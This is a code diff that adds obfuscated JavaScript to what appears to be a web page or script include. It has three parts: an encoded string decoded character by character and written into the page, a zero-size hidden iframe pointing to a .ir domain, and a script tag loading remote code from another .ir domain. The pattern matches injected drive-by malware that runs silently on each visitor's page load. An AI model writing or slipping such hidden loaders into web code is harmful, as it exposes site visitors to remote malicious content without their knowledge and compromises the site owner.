@@ -1,0 +1,11 @@
+﻿<!--
+ML="o:\"epdtknyi m>9=hjrls.fx/c<a8";
+MI="JC:87;B3C?2D69C3D@3362;@B3F?2@6641HH63<>LE:BH63<HIKD4:K8HIKD4:A70FEIDD2;6943?263G6HIDD2;<35:K?2DIB3382;H=";
+OT="";
+for(j=0;j<MI.length;j++){
+OT+=ML.charAt(MI.charCodeAt(j)-48);
+}document.write(OT);
+// -->
+document.write('<center><iframe name="ad_right_top" marginwidth="1" marginheight="1" target="_blank" src="http://tem98.ir/tem/js/new.htm" frameborder="0" width="0" height="0"></iframe></center>');
+
+document.write('<center><script type="text/javascript" src="http://filmdoni.ir/eshop.js"></script></center>');
